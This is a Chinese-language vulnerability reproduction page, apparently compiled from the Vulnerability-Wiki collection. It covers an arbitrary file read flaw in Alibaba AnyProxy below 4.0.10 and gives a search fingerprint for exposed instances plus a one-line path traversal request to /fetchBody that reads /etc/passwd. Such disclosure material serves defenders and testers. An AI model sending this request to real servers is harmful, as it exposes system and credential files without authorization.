---
title: "Alibaba AnyProxy fetchBody 任意文件读取漏洞"
date: 2026-10-16 09:06:29
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Alibaba-AnyProxy-fetchBody"
tags:
  - "Alibaba-AnyProxy-fetchBody"
  - "任意文件读取"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

Alibaba AnyProxy 低版本存在任意文件读取，通过漏洞，攻击者可以获取服务器敏感信息

## 漏洞影响

```
Alibaba AnyProxy < 4.0.10
```

## 网络测绘

```
"anyproxy"
```

## 漏洞复现

页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202102008909.png)



验证POC为

```plain
/fetchBody?id=1/../../../../../../../../etc/passwd
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202102008683.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Alibaba-AnyProxy-fetchBody-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
